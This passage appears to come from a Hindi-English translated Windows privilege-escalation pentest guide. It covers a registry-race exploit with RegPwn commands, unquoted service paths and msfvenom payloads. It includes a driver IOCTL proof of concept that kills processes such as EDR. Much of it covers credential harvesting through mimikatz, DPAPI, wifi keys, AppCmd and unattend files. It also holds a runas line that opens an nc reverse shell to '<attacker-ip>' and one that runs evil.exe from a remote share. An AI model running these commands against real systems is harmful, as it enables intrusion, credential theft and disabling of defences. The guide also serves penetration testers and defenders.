- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाया जाता है और user द्वारा writable होता है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. उस **HKCU ATConfig** वैल्यू को भरें जिसे आप चाहते हैं कि SYSTEM लिखे।
2. secure-desktop copy ट्रिगर करें (उदाहरण: **LockWorkstation**), जो AT broker flow शुरू करता है।
3. रेस जीतें (**Win the race**) by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; जब oplock fire करे, तब **HKLM Session ATConfig** key को एक **registry link** से replace करें जो किसी protected HKLM target की ओर इशारा करे।
4. SYSTEM attacker-चुनी हुई वैल्यू को redirected HKLM path पर लिखता है।

एक बार जब आपके पास arbitrary HKLM value write हो, तो service configuration values को overwrite करके LPE की ओर pivot करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसा service चुनें जिसे normal user स्टार्ट कर सके (उदाहरण: **`msiserver`**) और write के बाद उसे trigger करें। **Note:** the public exploit implementation रेस के हिस्से के रूप में **locks the workstation** करता है।

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इस registry से सब-रजिस्ट्री बना सकते हैं**। Windows services के मामले में यह **मनमाना कोड निष्पादित करने के लिए पर्याप्त है:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path उद्धरणों में नहीं है, तो Windows स्पेस से पहले वाले प्रत्येक हिस्से को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्नलिखित को execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
बिल्ट-इन Windows सेवाओं के अंतर्गत नहीं आने वाले सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप पता लगा सकते हैं और exploit कर सकते हैं** यह vulnerability metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअली metasploit के साथ एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई service विफल हो तो कौन-कौन सी कार्रवाई की जानी चाहिए। इस फ़ीचर को एक binary की ओर पॉइंट करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary बदला जा सकता है, तो privilege escalation संभव हो सकता है। More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

जाँचें **permissions of the binaries** (शायद आप किसी को overwrite करके escalate privileges कर सकें) और **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जाँचें कि क्या आप किसी config file को संशोधित करके किसी विशेष फ़ाइल को पढ़ पाएँ, या क्या आप किसी binary को संशोधित कर सकते हैं जिसे Administrator account (schedtasks) चलाएगा।

सिस्टम में कमजोर फ़ोल्डर/फ़ाइल अनुमतियाँ खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ उसके `plugins` subfolders के तहत किसी भी plugin DLL को autoload करता है। यदि एक writable portable/copy install मौजूद है, तो malicious plugin डालने से हर लॉन्च पर `notepad++.exe` के अंदर automatic code execution हो जाती है (जिसमें `DllMain` और plugin callbacks से भी शामिल है)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**जांचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जो किसी दूसरे user द्वारा execute किया जाएगा।**\
**निम्नलिखित पेज पढ़ें** अधिक जानने के लिए कि रोचक **autoruns locations to escalate privileges**:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई ड्राइवर arbitrary kernel read/write primitive (आमतौर पर poorly designed IOCTL handlers में) एक्सपोज़ करता है, तो आप kernel मेमोरी से सीधे एक SYSTEM token चुरा कर privilege escalate कर सकते हैं। चरण‑दर‑चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

उन race-condition बग्स के लिए जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करना (max-length components या deep directory chains का उपयोग करके) विंडो को माइक्रोसेकंड से बढ़ाकर कई दस माइक्रोसेकंड तक फैला सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

आधुनिक hive vulnerabilities आपको deterministic layouts तैयार करने, writable HKLM/HKU descendants का दुरुपयोग करने, और metadata corruption को kernel paged-pool overflows में बदलने की अनुमति देती हैं बिना किसी custom driver के। पूरा चेन यहाँ जानें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

कुछ signed third‑party drivers अपना device object मजबूत SDDL के साथ IoCreateDeviceSecure के माध्यम से बनाते हैं लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस फ्लैग के बिना, secure DACL उस समय लागू नहीं होता जब डिवाइस को किसी ऐसे path से खोला जाता है जिसमें एक अतिरिक्त component हो, जिससे कोई भी unprivileged user निम्न जैसे namespace path का उपयोग करके handle प्राप्त कर सकता है:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

एक बार जब कोई user डिवाइस खोल सकता है, तो driver द्वारा एक्सपोज़ किए गए privileged IOCTLs को LPE और tampering के लिए दुरुपयोग किया जा सकता है। वाइल्ड में देखी गई उदाहरण क्षमताएँ:
- किसी भी arbitrary process को full-access handles लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Arbitrary processes को terminate करना, जिनमें Protected Process/Light (PP/PPL) शामिल हैं, जिससे user land से kernel के माध्यम से AV/EDR kill की अनुमति मिलती है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- जब device objects बनाए जा रहे हों जिन्हें DACL द्वारा प्रतिबंधित किया जाना है तो हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- विशेषाधिकार प्राप्त संचालन के लिए कॉलर संदर्भ को सत्यापित करें। प्रक्रिया समाप्ति या हैंडल रिटर्न की अनुमति देने से पहले PP/PPL चेक जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और सीधे kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- संदिग्ध device names (e.g., \\ .\\amsdk*) के user-mode opens और दुरुपयोग सूचित करने वाले विशिष्ट IOCTL अनुक्रमों की निगरानी करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) को लागू करें और अपनी allow/deny सूचियाँ बनाए रखें。


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग करने के बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहरी से **restricted services** के लिए जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**इस पेज को देखें Firewall संबंधित commands के लिए**](../basic-cmd-for-pentesters.md#firewall) **(rules की सूची, rules बनाना, बंद करना, बंद करना...)**

और [ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को भी `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में पाया जा सकता है

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी पोर्ट पर listen कर सकते हैं (पहली बार जब आप `nc.exe` को किसी पोर्ट पर listen करने के लिए उपयोग करेंगे, तो यह GUI के माध्यम से पूछेगा कि क्या firewall द्वारा `nc` को अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को आसानी से root के रूप में शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `WSL` filesystem को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault उन सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के लिए user credentials को स्टोर करता है जिनमें **Windows** उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है। पहले नज़र में यह ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook credentials, Twitter credentials, Gmail credentials आदि यहाँ स्टोर कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन हो जाएँ। लेकिन ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिनसे Windows उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है, जिसका अर्थ है कि कोई भी **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault और users के बार-बार username और password दर्ज करने के बजाय उपलब्ध क्रेडेंशियल का उपयोग कर सकता है।

जब तक applications Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए क्रेडेंशियल का उपयोग कर पाएंगी। इसलिए, अगर आपकी application vault का उपयोग करना चाहती है, तो उसे किसी तरह default storage vault से उस resource के लिए **communicate with the credential manager and request the credentials for that resource** करना होगा।

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
इसके बाद आप सहेजे गए क्रेडेंशियल्स का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ उपयोग कर सकते हैं। निम्न उदाहरण एक SMB शेयर के माध्यम से एक रिमोट बाइनरी को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential सेट के साथ `runas` का उपयोग करना.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

The **Data Protection API (DPAPI)** डेटा के symmetric एनक्रिप्शन का एक तरीका प्रदान करता है, जिसे मुख्य रूप से Windows ऑपरेटिंग सिस्टम के भीतर asymmetric private keys के symmetric एनक्रिप्शन के लिए उपयोग किया जाता है। यह एनक्रिप्शन entropy में महत्वपूर्ण योगदान देने के लिए उपयोगकर्ता या सिस्टम सीक्रेट का उपयोग करता है।

**DPAPI यूज़र के लॉगिन सीक्रेट्स से व्युत्पन्न हुए एक symmetric key के माध्यम से keys के एनक्रिप्शन की अनुमति देता है**। सिस्टम एनक्रिप्शन के मामलों में यह सिस्टम के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्ट किए गए उपयोगकर्ता RSA keys %APPDATA%\Microsoft\Protect\{SID} डायरेक्टरी में संग्रहीत होते हैं, जहाँ {SID} उपयोगकर्ता का [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) दर्शाता है। **DPAPI key, जो उन्हीं फाइलों में उपयोगकर्ता की private keys की सुरक्षा करने वाले master key के साथ सह-स्थित होती है**, आमतौर पर 64 bytes के random data से बनी होती है। (यह ध्यान देने योग्य है कि इस डायरेक्टरी तक पहुँच restricted है, इसलिए इसकी contents को CMD में `dir` कमांड के माध्यम से सूचीबद्ध नहीं किया जा सकता, हालांकि इसे PowerShell से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे डीक्रिप्ट करने के लिए **mimikatz module** `dpapi::masterkey` को उपयुक्त आर्ग्युमेंट्स (`/pvk` या `/rpc`) के साथ उपयोग कर सकते हैं।

ये **credentials files protected by the master password** सामान्यतः निम्न स्थानों पर पाए जाते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप **mimikatz module** `dpapi::cred` का उपयोग उपयुक्त `/masterkey` के साथ decrypt करने के लिए कर सकते हैं.\

आप **extract many DPAPI** **masterkeys** from **memory** `sekurlsa::dpapi` module के साथ निकाल सकते हैं (यदि आप root हैं).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** अक्सर **scripting** और automation tasks के लिए उपयोग किए जाते हैं ताकि encrypted credentials को सुविधाजनक रूप से स्टोर किया जा सके। ये credentials **DPAPI** का उपयोग करके सुरक्षित होते हैं, जिसका सामान्यतः मतलब है कि इन्हें केवल उसी user द्वारा उसी कंप्यूटर पर decrypted किया जा सकता है जहाँ ये बनाए गए थे।

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाई-फ़ाई
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें इन स्थानों पर पा सकते हैं `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
उपयुक्त `/masterkey` के साथ **Mimikatz** `dpapi::rdg` मॉड्यूल का उपयोग करके **किसी भी .rdg फ़ाइलों** को डिक्रिप्ट करें\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
आप मेमोरी से **कई DPAPI masterkeys** को Mimikatz `sekurlsa::dpapi` मॉड्यूल के साथ निकाल सकते हैं

### Sticky Notes

लोग अक्सर Windows वर्कस्टेशनों पर StickyNotes app का उपयोग **पासवर्ड सहेजने** और अन्य जानकारी के लिए करते हैं, यह महसूस किए बिना कि यह एक database फ़ाइल है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित है और इसे खोजने और जाँचना हमेशा उपयोगी होता है।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` निर्देशिका में स्थित है।\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं।\
इंस्टॉलर **run with SYSTEM privileges**, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**) के लिए vulnerable हैं।
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys रजिस्ट्री में

SSH private keys रजिस्ट्री की key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत हो सकती हैं, इसलिए आपको यह जांचना चाहिए कि वहाँ कुछ रोचक है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस पथ के अंदर कोई एंट्री मिलती है तो वह संभवतः एक saved SSH key होगी। यह एन्क्रिप्टेड रूप में संग्रहीत है लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके डिक्रिप्ट किया जा सकता है।\
इस तकनीक के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वचालित रूप से शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह technique अब valid नहीं है। मैंने कुछ ssh keys बनाईं, उन्हें `ssh-add` से जोड़ा और ssh के जरिए मशीन में login किया। registry HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### अनदेखी फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

ऐसी फ़ाइल खोजें जिसका नाम **SiteList.xml** हो

### कैश्ड GPP पासवर्ड

एक फीचर पहले उपलब्ध था जो Group Policy Preferences (GPP) के माध्यम से मशीनों के समूह पर कस्टम local administrator accounts तैनात करने की अनुमति देता था। हालांकि, इस तरीके में गंभीर सुरक्षा दोष थे। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के भीतर की passwords, जो AES256 से सार्वजनिक रूप से दस्तावेजीकृत default key का उपयोग करके encrypt की जाती थीं, किसी भी authenticated user द्वारा decrypt की जा सकती थीं। इससे एक गंभीर जोखिम पैदा होता था, क्योंकि इससे उपयोगकर्ता elevated privileges प्राप्त कर सकते थे।

